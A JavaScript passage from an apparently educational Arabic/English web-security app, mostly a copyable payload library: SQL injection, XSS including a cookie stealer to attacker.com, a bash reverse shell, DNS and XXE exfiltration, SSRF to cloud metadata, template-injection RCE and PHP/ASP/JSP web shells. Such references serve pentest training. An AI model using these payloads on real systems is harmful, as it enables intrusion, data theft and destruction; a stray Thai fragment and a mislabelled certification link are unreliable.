                <code>nmap -A target.com</code> - ${txt('فحص شامل', 'Aggressive scan')}
              </div>
            </div>
          </div>
        </div>
        
      </div>
    </div>
  `;
}


function pagePayloads() {
  // Comprehensive Payload Library
  const payloadCategories = [
    {
      id: 'sqli',
      name: 'SQL Injection',
      icon: 'fa-database',
      color: '#e74c3c',
      description: 'حقن SQL للوصول إلى قواعد البيانات',
      payloads: [
        { name: 'Basic Auth Bypass', payload: "' OR '1'='1", desc: 'تجاوز نموذج تسجيل الدخول' },
        { name: 'Auth Bypass 2', payload: "' OR 1=1--", desc: 'تجاوز مع تعليق' },
        { name: 'Auth Bypass 3', payload: "admin'--", desc: 'تسجيل دخول كمسؤول' },
        { name: 'UNION Based', payload: "' UNION SELECT NULL,NULL,NULL--", desc: 'اكتشاف عدد الأعمدة' },
        { name: 'Extract Tables', payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", desc: 'استخراج أسماء الجداول' },
        { name: 'Extract Columns', payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc: 'استخراج أسماء الأعمدة' },
        { name: 'Extract Data', payload: "' UNION SELECT username,password FROM users--", desc: 'استخراج بيانات المستخدمين' },
        { name: 'Time Based Blind', payload: "'; WAITFOR DELAY '0:0:5'--", desc: 'SQL أعمى مبني على الوقت' },
        { name: 'Boolean Blind', payload: "' AND 1=1--", desc: 'SQL أعمى مبني على المنطق' },
        { name: 'Error Based', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", desc: 'SQL مبني على الخطأ' },
        { name: 'Stacked Queries', payload: "'; DROP TABLE users;--", desc: 'استعلامات متعددة' },
        { name: 'Out-of-Band', payload: "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\'))--", desc: 'تسريب البيانات خارج النطاق' }
      ]
    },
    {
      id: 'xss',
      name: 'XSS (Cross-Site Scripting)',
      icon: 'fa-code',
      color: '#f39c12',
      description: 'حقن السكريبتات في صفحات الويب',
      payloads: [
        { name: 'Basic Alert', payload: "<script>alert('XSS')</script>", desc: 'XSS الأساسي' },
        { name: 'IMG Tag', payload: "<img src=x onerror=alert('XSS')>", desc: 'XSS عبر عنصر الصورة' },
        { name: 'SVG Tag', payload: "<svg/onload=alert('XSS')>", desc: 'XSS عبر SVG' },
        { name: 'Event Handler', payload: "<body onload=alert('XSS')>", desc: 'XSS عبر حدث التحميل' },
        { name: 'Input Focus', payload: "<input onfocus=alert('XSS') autofocus>", desc: 'XSS عند التركيز' },
        { name: 'Anchor Tag', payload: "<a href='javascript:alert(1)'>Click</a>", desc: 'XSS عبر الرابط' },
        { name: 'Cookie Stealer', payload: "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>", desc: 'سرقة الكوكيز' },
        { name: 'DOM XSS', payload: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", desc: 'XSS مشفر Base64' },
        { name: 'Polyglot', payload: "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcLiCk=alert() )//", desc: 'Polyglot متعدد السياقات' },
        { name: 'Template Literal', payload: "${alert('XSS')}", desc: 'XSS في Template Literals' },
        { name: 'No Parentheses', payload: "<script>alert`XSS`</script>", desc: 'XSS بدون أقواس' },
        { name: 'SVG Animate', payload: "<svg><animate onbegin=alert(1) attributeName=x>", desc: 'XSS عبر SVG Animate' }
      ]
    },
    {
      id: 'cmdi',
      name: 'Command Injection',
      icon: 'fa-terminal',
      color: '#9b59b6',
      description: 'حقن أوامر النظام',
      payloads: [
        { name: 'Semicolon', payload: "; id", desc: 'فاصل أوامر Unix' },
        { name: 'Pipe', payload: "| id", desc: 'أنبوب لأمر جديد' },
        { name: 'Ampersand', payload: "& id", desc: 'تنفيذ في الخلفية' },
        { name: 'Double Ampersand', payload: "&& id", desc: 'تنفيذ شرطي' },
        { name: 'Backticks', payload: "`id`", desc: 'تنفيذ الأمر' },
        { name: 'Dollar Sign', payload: "$(id)", desc: 'تنفيذ الأمر بديل' },
        { name: 'Newline', payload: "%0aid", desc: 'سطر جديد مشفر' },
        { name: 'Read /etc/passwd', payload: "; cat /etc/passwd", desc: 'قراءة ملف المستخدمين' },
        { name: 'Reverse Shell', payload: "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", desc: 'شل عكسي' },
        { name: 'Windows Pipe', payload: "| whoami", desc: 'Windows command' },
        { name: 'Time Delay', payload: "; sleep 5", desc: 'تأخير زمني' },
        { name: 'DNS Exfil', payload: "; nslookup $(whoami).attacker.com", desc: 'تسريب عبر DNS' }
      ]
    },
    {
      id: 'lfi',
      name: 'LFI/RFI (File Inclusion)',
      icon: 'fa-folder-open',
      color: '#3498db',
      description: 'تضمين الملفات المحلية والبعيدة',
      payloads: [
        { name: 'Basic LFI', payload: "../../../etc/passwd", desc: 'قراءة ملف passwd' },
        { name: 'Null Byte', payload: "../../../etc/passwd%00", desc: 'تجاوز امتداد الملف' },
        { name: 'Double Encoding', payload: "..%252f..%252f..%252fetc/passwd", desc: 'ترميز مزدوج' },
        { name: 'PHP Wrapper', payload: "php://filter/convert.base64-encode/resource=index.php", desc: 'قراءة كود PHP' },
        { name: 'Data Wrapper', payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==", desc: 'تنفيذ كود PHP' },
        { name: 'Expect Wrapper', payload: "expect://id", desc: 'تنفيذ أمر' },
        { name: 'Input Wrapper', payload: "php://input", desc: 'قراءة من POST' },
        { name: 'Windows LFI', payload: "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts", desc: 'LFI على Windows' },
        { name: 'Log Poisoning', payload: "/var/log/apache2/access.log", desc: 'تسميم السجلات' },
        { name: 'SSH Log', payload: "/var/log/auth.log", desc: 'سجل SSH' },
        { name: 'Proc Self', payload: "/proc/self/environ", desc: 'متغيرات البيئة' },
        { name: 'RFI', payload: "http://attacker.com/shell.php", desc: 'تضمين ملف بعيد' }
      ]
    },
    {
      id: 'xxe',
      name: 'XXE (XML External Entity)',
      icon: 'fa-file-code',
      color: '#1abc9c',
      description: 'حقن كيانات XML الخارجية',
      payloads: [
        { name: 'Basic XXE', payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', desc: 'قراءة ملف' },
        { name: 'XXE SSRF', payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>', desc: 'SSRF عبر XXE' },
        { name: 'Blind XXE', payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>', desc: 'XXE أعمى' },
        { name: 'Parameter Entity', payload: '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]>', desc: 'تسريب بيانات' },
        { name: 'PHP Expect', payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>', desc: 'تنفيذ أمر' },
        { name: 'Error Based', payload: '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % error "<!ENTITY &#x25; sp SYSTEM \'file:///nonexistent/%file;\'>">%error;%sp;]>', desc: 'XXE مبني على الخطأ' }
      ]
    },
    {
      id: 'ssrf',
      name: 'SSRF (Server-Side Request Forgery)',
      icon: 'fa-server',
      color: '#e67e22',
      description: 'تزوير طلبات من جانب الخادم',
      payloads: [
        { name: 'Localhost', payload: "http://127.0.0.1/", desc: 'الوصول للخادم المحلي' },
        { name: 'Localhost Alt', payload: "http://localhost/", desc: 'بديل localhost' },
        { name: 'IPv6 Localhost', payload: "http://[::1]/", desc: 'IPv6 محلي' },
        { name: 'Decimal IP', payload: "http://2130706433/", desc: 'IP عشري' },
        { name: 'Hex IP', payload: "http://0x7f000001/", desc: 'IP ست عشري' },
        { name: 'AWS Metadata', payload: "http://169.254.169.254/latest/meta-data/", desc: 'بيانات AWS' },
        { name: 'GCP Metadata', payload: "http://metadata.google.internal/computeMetadata/v1/", desc: 'بيانات GCP' },
        { name: 'Azure Metadata', payload: "http://169.254.169.254/metadata/instance", desc: 'بيانات Azure' },
        { name: 'Internal Port Scan', payload: "http://127.0.0.1:22/", desc: 'فحص المنافذ' },
        { name: 'File Protocol', payload: "file:///etc/passwd", desc: 'قراءة ملفات' },
        { name: 'Gopher Protocol', payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", desc: 'هجوم على Redis' }
      ]
    },
    {
      id: 'ssti',
      name: 'SSTI (Server-Side Template Injection)',
      icon: 'fa-puzzle-piece',
      color: '#8e44ad',
      description: 'حقن قوالب من جانب الخادم',
      payloads: [
        { name: 'Detection', payload: "{{7*7}}", desc: 'اكتشاف SSTI' },
        { name: 'Jinja2 RCE', payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", desc: 'تنفيذ أمر Jinja2' },
        { name: 'Twig RCE', payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", desc: 'تنفيذ أمر Twig' },
        { name: 'Freemarker', payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", desc: 'Freemarker RCE' },
        { name: 'Smarty', payload: "{php}echo `id`;{/php}", desc: 'Smarty RCE' },
        { name: 'Mako', payload: "${self.module.cache.util.os.popen('id').read()}", desc: 'Mako RCE' },
        { name: 'ERB Ruby', payload: "<%= system('id') %>", desc: 'ERB RCE' },
        { name: 'Pebble', payload: "{% set cmd = 'id' %}{% for d in (1).getClass().forName('java.lang.Runtime').getMethods() %}{% if d.getName() == 'exec' %}{{ d.invoke((1).getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null), cmd) }}{% endif %}{% endfor %}", desc: 'Pebble RCE' }
      ]
    },
    {
      id: 'idor',
      name: 'IDOR (Insecure Direct Object Reference)',
      icon: 'fa-key',
      color: '#16a085',
      description: 'مرجع مباشر غير آمن للكائنات',
      payloads: [
        { name: 'Sequential IDs', payload: "/api/user/1, /api/user/2, /api/user/3", desc: 'تغيير IDs متسلسلة' },
        { name: 'UUID Brute', payload: "/api/user/550e8400-e29b-41d4-a716-446655440000", desc: 'تخمين UUID' },
        { name: 'Encoded ID', payload: "/api/user/MTAw (base64 of 100)", desc: 'IDs مشفرة' },
        { name: 'Parameter Pollution', payload: "/api/user?id=1&id=2", desc: 'تلويث البارامترات' },
        { name: 'HTTP Method', payload: "PUT /api/user/2 vs GET /api/user/2", desc: 'تغيير الطريقة' },
        { name: 'JSON Body', payload: '{"user_id": "other_user_id"}', desc: 'تغيير في JSON' },
        { name: 'Path Traversal IDOR', payload: "/api/files/../../../etc/passwd", desc: 'IDOR مع Path Traversal' }
      ]
    },
    {
      id: 'auth',
      name: 'Authentication Bypass',
      icon: 'fa-unlock',
      color: '#c0392b',
      description: 'تجاوز المصادقة',
      payloads: [
        { name: 'Default Creds', payload: "admin:admin, admin:password, root:root", desc: 'بيانات افتراضية' },
        { name: 'Empty Password', payload: "admin:", desc: 'كلمة مرور فارغة' },
        { name: 'SQL Auth Bypass', payload: "admin'--", desc: 'تجاوز SQL' },
        { name: 'NoSQL Bypass', payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}', desc: 'تجاوز NoSQL' },
        { name: 'JWT None Algo', payload: '{"alg":"none"}', desc: 'خوارزمية JWT فارغة' },
        { name: 'Password Reset Token', payload: "Reuse old tokens, Brute force tokens", desc: 'استغلال رموز إعادة التعيين' },
        { name: 'OAuth Redirect', payload: "redirect_uri=https://attacker.com", desc: 'إعادة توجيه OAuth' },
        { name: '2FA Bypass', payload: "Skip 2FA page, Reuse old codes", desc: 'تجاوز المصادقة الثنائية' }
      ]
    },
    {
      id: 'upload',
      name: 'File Upload',
      icon: 'fa-upload',
      color: '#27ae60',
      description: 'استغلال رفع الملفات',
      payloads: [
        { name: 'PHP Shell', payload: "<?php system($_GET['c']); ?>", desc: 'شل PHP بسيط' },
        { name: 'Double Extension', payload: "shell.php.jpg", desc: 'امتداد مزدوج' },
        { name: 'Null Byte', payload: "shell.php%00.jpg", desc: 'Null byte في الاسم' },
        { name: 'MIME Type', payload: "Content-Type: image/jpeg", desc: 'تغيير نوع MIME' },
        { name: 'Magic Bytes', payload: "GIF89a<?php system($_GET['c']); ?>", desc: 'إضافة Magic Bytes' },
        { name: 'SVG XSS', payload: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', desc: 'XSS عبر SVG' },
        { name: 'Polyglot', payload: "Create PHP/JPEG polyglot", desc: 'ملف متعدد الأنواع' },
        { name: '.htaccess', payload: "AddType application/x-httpd-php .jpg", desc: 'تنفيذ PHP من jpg' },
        { name: 'ASP Shell', payload: "<%eval request('c')%>", desc: 'شل ASP' },
        { name: 'JSP Shell', payload: '<% Runtime.getRuntime().exec(request.getParameter("c")); %>', desc: 'شل JSP' }
      ]
    }
  ];

  return `
    <div class="container-fluid mt-4">
      <style>
        .payloads-hero {
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
          border-radius: 24px;
          padding: 40px;
          color: white;
          margin-bottom: 30px;
          position: relative;
          overflow: hidden;
        }
        .payloads-hero::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
          opacity: 0.5;
        }
        .payloads-hero h1 { margin: 0 0 10px; font-weight: 800; font-size: 2.5rem; position: relative; }
        .payloads-hero .subtitle { opacity: 0.9; font-size: 1.1rem; position: relative; }
        .hero-stats {
          display: flex;
          gap: 30px;
          margin-top: 25px;
          position: relative;
        }
        .hero-stat {
          background: rgba(255,255,255,0.1);
          padding: 15px 25px;
          border-radius: 12px;
          backdrop-filter: blur(10px);
        }
        .hero-stat-value { font-size: 2rem; font-weight: 700; color: #00d9ff; }
        .hero-stat-label { font-size: 0.85rem; opacity: 0.8; }
        .search-section {
          background: white;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 25px;
          box-shadow: 0 5px 20px rgba(0,0,0,0.08);
        }
        .search-box {
          display: flex;
          gap: 15px;
          align-items: center;
        }
        .search-box input {
          flex: 1;
          padding: 15px 25px;
          border: 2px solid #e9ecef;
          border-radius: 12px;
          font-size: 1rem;
          transition: all 0.3s;
        }
        .search-box input:focus {
          outline: none;
          border-color: #667eea;
          box-shadow: 0 0 0 4px rgba(102,126,234,0.1);
        }
        .category-filters {
          display: flex;
          gap: 10px;
          flex-wrap: wrap;
          margin-top: 15px;
        }
        .filter-btn {
          padding: 8px 16px;
          border-radius: 20px;
          border: 2px solid #e9ecef;
          background: white;
          cursor: pointer;
          transition: all 0.2s;
          font-size: 0.85rem;
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .filter-btn:hover, .filter-btn.active {
          background: #667eea;
          color: white;
          border-color: #667eea;
        }
        .categories-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
          gap: 20px;
        }
        .category-card {
          background: white;
          border-radius: 16px;
          overflow: hidden;
          border: 1px solid #e9ecef;
          transition: all 0.3s;
        }
        .category-card:hover {
          box-shadow: 0 15px 40px rgba(0,0,0,0.1);
          transform: translateY(-3px);
        }
        .category-header {
          padding: 20px;
          color: white;
          display: flex;
          align-items: center;
          gap: 15px;
        }
        .category-header i {
          font-size: 1.8rem;
          opacity: 0.9;
        }
        .category-header-info h3 { margin: 0; font-weight: 700; font-size: 1.2rem; }
        .category-header-info p { margin: 5px 0 0; font-size: 0.85rem; opacity: 0.9; }
        .category-payloads {
          padding: 15px;
          max-height: 400px;
          overflow-y: auto;
        }
        .payload-item {
          background: #f8f9fa;
          border-radius: 10px;
          padding: 12px 15px;
          margin-bottom: 10px;
          cursor: pointer;
          transition: all 0.2s;
          border: 1px solid transparent;
        }
        .payload-item:hover {
          background: #e9ecef;
          border-color: #667eea;
        }
        .payload-item:last-child { margin-bottom: 0; }
        .payload-name {
          font-weight: 600;
          font-size: 0.9rem;
          color: #333;
          margin-bottom: 5px;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .payload-name .copy-btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 4px 10px;
          border-radius: 6px;
          font-size: 0.75rem;
          cursor: pointer;
          opacity: 0;
          transition: all 0.2s;
        }
        .payload-item:hover .copy-btn { opacity: 1; }
        .payload-code {
          background: #1e1e2e;
          color: #a6e3a1;
          padding: 8px 12px;
          border-radius: 6px;
          font-family: 'Fira Code', 'Consolas', monospace;
          font-size: 0.8rem;
          overflow-x: auto;
          white-space: pre-wrap;
          word-break: break-all;
        }
        .payload-desc {
          font-size: 0.75rem;
          color: #666;
          margin-top: 6px;
        }
        .resources-section {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          border-radius: 16px;
          padding: 25px;
          margin-top: 30px;
          color: white;
        }
        .resources-section h4 { margin: 0 0 20px; }
        .resources-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
          gap: 15px;
        }
        .resource-link {
          background: rgba(255,255,255,0.15);
          padding: 15px;
          border-radius: 12px;
          text-decoration: none;
          color: white;
          display: flex;
          align-items: center;
          gap: 12px;
          transition: all 0.3s;
        }
        .resource-link:hover {
          background: rgba(255,255,255,0.25);
          transform: translateY(-2px);
          color: white;
        }
        .resource-link i { font-size: 1.5rem; }
        .custom-payload-section {
          background: white;
          border-radius: 16px;
          padding: 25px;
          margin-top: 25px;
          border: 2px dashed #e9ecef;
        }
        .custom-payload-section h4 { margin: 0 0 15px; color: #333; }
        @media (max-width: 768px) {
          .categories-grid { grid-template-columns: 1fr; }
          .hero-stats { flex-direction: column; gap: 15px; }
        }
      </style>

      <!-- Hero Section -->
      <div class="payloads-hero">
        <h1><i class="fa-solid fa-code me-3"></i>\${txt('مكتبة الـ Payloads', 'Payloads Library')}</h1>
        <p class="subtitle">\${txt('مجموعة شاملة من payloads لاختبار الاختراق وصيد الثغرات', 'Comprehensive collection of payloads for penetration testing and bug hunting')}</p>
        <div class="hero-stats">
          <div class="hero-stat">
            <div class="hero-stat-value">\${payloadCategories.length}</div>
            <div class="hero-stat-label">\${txt('فئة', 'Categories')}</div>
          </div>
          <div class="hero-stat">
            <div class="hero-stat-value">\${payloadCategories.reduce((acc, cat) => acc + cat.payloads.length, 0)}+</div>
            <div class="hero-stat-label">\${txt('Payload', 'Payloads')}</div>
          </div>
          <div class="hero-stat">
            <div class="hero-stat-value">10</div>
            <div class="hero-stat-label">\${txt('نوع ثغرة', 'Vuln Types')}</div>
          </div>
        </div>
      </div>

      <!-- Search & Filter Section -->
      <div class="search-section">
        <div class="search-box">
          <i class="fa-solid fa-search" style="color: #999; font-size: 1.2rem;"></i>
          <input type="text" id="payload-search" placeholder="\${txt('ابحث عن payload...', 'Search for a payload...')}" onkeyup="filterPayloads()">
        </div>
        <div class="category-filters">
          <button class="filter-btn active" onclick="filterByCategory('all')">
            <i class="fa-solid fa-layer-group"></i> \${txt('الكل', 'All')}
          </button>
          \${payloadCategories.map(cat => \`
            <button class="filter-btn" onclick="filterByCategory('\${cat.id}')" data-category="\${cat.id}">
              <i class="fa-solid \${cat.icon}"></i> \${cat.name}
            </button>
          \`).join('')}
        </div>
      </div>

      <!-- Categories Grid -->
      <div class="categories-grid" id="categories-grid">
        \${payloadCategories.map(cat => \`
          <div class="category-card" data-category="\${cat.id}">
            <div class="category-header" style="background: linear-gradient(135deg, \${cat.color}, \${adjustColor(cat.color, -20)});">
              <i class="fa-solid \${cat.icon}"></i>
              <div class="category-header-info">
                <h3>\${cat.name}</h3>
                <p>\${cat.payloads.length} payloads</p>
              </div>
            </div>
            <div class="category-payloads">
              \${cat.payloads.map((p, i) => \`
                <div class="payload-item" data-payload="\${escapeHtml(p.payload)}">
                  <div class="payload-name">
                    <span>\${p.name}</span>
                    <button class="copy-btn" onclick="copyPayload(this, '\${escapeHtml(p.payload).replace(/'/g, "\\\\'")}')">
                      <i class="fa-solid fa-copy"></i> \${txt('نسخ', 'Copy')}
                    </button>
                  </div>
                  <div class="payload-code">\${escapeHtml(p.payload)}</div>
                  <div class="payload-desc">\${p.desc}</div>
                </div>
              \`).join('')}
            </div>
          </div>
        \`).join('')}
      </div>

      <!-- Resources Section -->
      <div class="resources-section">
        <h4><i class="fa-solid fa-book-open me-2"></i>\${txt('مصادر إضافية', 'Additional Resources')}</h4>
        <div class="resources-grid">
          <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" class="resource-link">
            <i class="fa-brands fa-github"></i>
            <span>PayloadsAllTheThings</span>
          </a>
          <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="resource-link">
            <i class="fa-solid fa-scroll"></i>
            <span>XSS Cheat Sheet</span>
          </a>
          <a href="https://github.com/payloadbox" target="_blank" class="resource-link">
            <i class="fa-solid fa-box"></i>
            <span>PayloadBox</span>
          </a>
          <a href="https://book.hacktricks.xyz/" target="_blank" class="resource-link">
            <i class="fa-solid fa-hat-wizard"></i>
            <span>HackTricks</span>
          </a>
        </div>
      </div>

      <!-- Custom Payload Section -->
      <div class="custom-payload-section">
        <h4><i class="fa-solid fa-wand-magic-sparkles me-2"></i>\${txt('أضف Payload مخصص', 'Add Custom Payload')}</h4>
        <div class="row g-3">
          <div class="col-md-4">
            <input type="text" class="form-control" id="custom-payload-name" placeholder="\${txt('اسم الـ Payload', 'Payload Name')}">
          </div>
          <div class="col-md-6">
            <input type="text" class="form-control" id="custom-payload-value" placeholder="\${txt('الـ Payload', 'Payload')}">
          </div>
          <div class="col-md-2">
            <button class="btn btn-primary w-100" onclick="addCustomPayload()">
              <i class="fa-solid fa-plus"></i> \${txt('إضافة', 'Add')}
            </button>
          </div>
        </div>
      </div>
    </div>
  `;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function adjustColor(color, amount) {
  const clamp = (num) => Math.min(255, Math.max(0, num));
  const hex = color.replace('#', '');
  const r = clamp(parseInt(hex.substr(0, 2), 16) + amount);
  const g = clamp(parseInt(hex.substr(2, 2), 16) + amount);
  const b = clamp(parseInt(hex.substr(4, 2), 16) + amount);
  return '#' + [r, g, b].map(x => x.toString(16).padStart(2, '0')).join('');
}

function copyPayload(btn, payload) {
  navigator.clipboard.writeText(payload.replace(/\\\\'/g, "'"));
  const originalText = btn.innerHTML;
  btn.innerHTML = '<i class="fa-solid fa-check"></i> ' + txt('تم!', 'Done!');
  btn.style.background = '#2ecc71';
  setTimeout(() => {
    btn.innerHTML = originalText;
    btn.style.background = '#667eea';
  }, 1500);
}

function filterPayloads() {
  const search = document.getElementById('payload-search').value.toLowerCase();
  document.querySelectorAll('.payload-item').forEach(item => {
    const text = item.textContent.toLowerCase();
    item.style.display = text.includes(search) ? 'block' : 'none';
  });
}

function filterByCategory(category) {
  document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
  event.target.closest('.filter-btn').classList.add('active');

  document.querySelectorAll('.category-card').forEach(card => {
    if (category === 'all' || card.dataset.category === category) {
      card.style.display = 'block';
    } else {
      card.style.display = 'none';
    }
  });
}

function addCustomPayload() {
  const name = document.getElementById('custom-payload-name').value;
  const value = document.getElementById('custom-payload-value').value;
  if (!name || !value) { alert(txt('الرجاء ملء جميع الحقول', 'Please fill all fields')); return; }

  const customs = JSON.parse(localStorage.getItem('custom_payloads') || '[]');
  customs.push({ name, payload: value, timestamp: Date.now() });
  localStorage.setItem('custom_payloads', JSON.stringify(customs));

  document.getElementById('custom-payload-name').value = '';
  document.getElementById('custom-payload-value').value = '';
  alert(txt('تمت الإضافة!', 'Added!'));
}

function pageNotes() {
  return `
    <div class="container mt-4">
    <h2><i class="fa-solid fa-book-bookmark"></i> ${txt('الملاحظات', 'Notes')}</h2>
    <div class="alert alert-info">
      ${txt('ملاحظات وإرشادات مفيدة لتطوير مهارات أمن تطبيقات الويب',
    'Useful notes and guidelines to develop web application security skills')}
    </div>

    <div class="card mb-4">
      <div class="card-header bg-primary text-white">
        <h5 class="mb-0"><i class="fa-solid fa-bug"></i> ${txt('الثغرات الشائعة', 'Common Vulnerabilities')}</h5>
      </div>
      <div class="card-body">
        <ul>
          <li>${txt('SQL Injection', 'SQL Injection')}</li>
          <li>${txt('XSS', 'XSS')}</li>
          <li>${txt('Command Injection', 'Command Injection')}</li>
          <li>${txt('File Upload Vulnerabilities', 'File Upload Vulnerabilities')}</li>
          <li>${txt('Authentication Bypass', 'Authentication Bypass')}</li>
          <li>${txt('LFI/RFI', 'LFI/RFI')}</li>
          <li>${txt('CSRF', 'CSRF')}</li>
          <li>${txt('SSRF', 'SSRF')}</li>
          <li>${txt('IDOR', 'IDOR')}</li>
          <li>${txt('Deserialization', 'Deserialization')}</li>
          <li>${txt('Insecure Direct Object References', 'Insecure Direct Object References')}</li>
          <li>${txt('Security Misconfiguration', 'Security Misconfiguration')}</li>
        </ul>
      </div>
    </div>

    <div class="card mb-4">
      <div class="card-header bg-success text-white">
        <h5 class="mb-0"><i class="fa-solid fa-book"></i> ${txt('مصادر مفيدة', 'Useful Resources')}</h5>
      </div>
      <div class="card-body">
        <div class="d-grid gap-2">
          <a href="https://owasp.org/" target="_blank" class="btn btn-outline-primary">
            <i class="fa-solid fa-globe"></i> OWASP
          </a>
          <a href="https://portswigger.net/web-security" target="_blank" class="btn btn-outline-success">
            <i class="fa-solid fa-globe"></i> PortSwigger Web Security Academy
          </a>
          <a href="https://www.hackthebox.com/" target="_blank" class="btn btn-outline-warning">
            <i class="fa-solid fa-box"></i> Hack The Box
          </a>
          <a href="https://tryhackme.com/" target="_blank" class="btn btn-outline-info">
            <i class="fa-solid fa-server"></i> TryHackMe
          </a>
        </div>
      </div>
    </div>

    <div class="card bg-light">
      <div class="card-body">
        <h5><i class="fa-solid fa-lightbulb"></i> ${txt('نصائح العامة', 'General Tips')}</h5>
        <ul class="small">
          <li>${txt('ابدأ بفهم أساسيات أمن تطبيقات الويب', 'Start by understanding web application security fundamentals')}</li>
          <li>${txt('تعلم OWASP Top 10', 'Learning OWASP Top 10')}</li>
          <li>${txt('مارس على المختبرات الآمنة مثل PortSwigger', 'Practice on safe labs like PortSwigger')}</li>
          <li>${txt('اقرأ التقارير المنشورة على HackerOne و Bugcrowd', 'Read disclosed reports on HackerOne and Bugcrowd')}</li>
          <li>${txt('جرب الثغرات على تطبيقاتك الخاصة أولاً', 'Test on your own applications first')}</li>
          <li>${txt('احترم نطاق الاختبار ولا تتجاوزه', 'Respect the scope and do not exceed it')}</li>
        </ul>
      </div>
    </div>
  </div > `;
}

/* DUPLICATE REMOVED - Using version at line 5469
function pagePlayground_OLD_1() {
  return `
    < div class="container mt-4" >
    <h2><i class="fa-solid fa-code"></i> ${txt('الملعب', 'Playground')}</h2>
    ...duplicate content removed...
  </div > `;
}
*/

/* DUPLICATE pageEjpt REMOVED - Using complete version at line 4987
function pageEjpt_OLD_SIMPLE() {
  return `
    < div class="container mt-4" >
    <h2><i class="fa-solid fa-graduation-cap"></i> ${txt('هندسة حاسوب الأخلاقية', 'Ethical Hacking')}</h2>
    <div class="alert alert-info">
      <i class="fa-solid fa-circle-info"></i> ${txt('دليل شامل لتعلم هندسة حاسوب الأخلاقية وإتقان مهاراتك في هذا المجال',
    'Comprehensive guide to learn ethical hacking and master your skills in this field')}
    </div>

    <div class="row g-4">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-primary text-white">
            <h5 class="mb-0"><i class="fa-solid fa-book-open"></i> ${txt('البدء في هندسة حاسوب الأخلاقية', 'Getting Started with Ethical Hacking')}</h5>
          </div>
          <div class="card-body">
            <ul>
              <li>${txt('فهم أسس أمن المعلومات', 'Understanding information security fundamentals')}</li>
              <li>${txt('تعلم البرمجة', 'Learning programming')}</li>
              <li>${txt('ทำความ مألوفاً بالأنظمة التشغيلية', 'Getting familiar with operating systems')}</li>
              <li>${txt('تعلم شبكات الكمبيوتر', 'Learning computer networks')}</li>
              <li>${txt('فهم أنواع الهجمات الشائعة', 'Understanding common attack types')}</li>
              <li>${txt('تعلم كيفية مواجهة الهجمات', 'Learning how to defend against attacks')}</li>
            </ul>
          </div>
        </div>
      </div>
      
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-success text-white">
            <h5 class="mb-0"><i class="fa-solid fa-bullseye"></i> ${txt('الموارد المتاحة', 'Available Resources')}</h5>
          </div>
          <div class="card-body">
            <div class="d-grid gap-2">
              <a href="https://www.offensive-security.com/pwk-oscp/" target="_blank" class="btn btn-outline-primary">
                <i class="fa-solid fa-shield-halved"></i> Offensive Security OSCP
              </a>
              <a href="https://www.certifiedhacker.com/" target="_blank" class="btn btn-outline-success">
                <i class="fa-solid fa-shield"></i> Certified Ethical Hacker
              </a>
              <a href="https://www.ejpt.com/" target="_blank" class="btn btn-outline-warning">
                <i class="fa-solid fa-shield-halved"></i> EC-Council EJPT
              </a>
              <a href="https://www.eccouncil.org/certified-ethical-hacker/" target="_blank" class="btn btn-outline-info">
                <i class="fa-solid fa-shield"></i> EC-Council Certified Ethical Hacker
              </a>
            </div>
          </div>
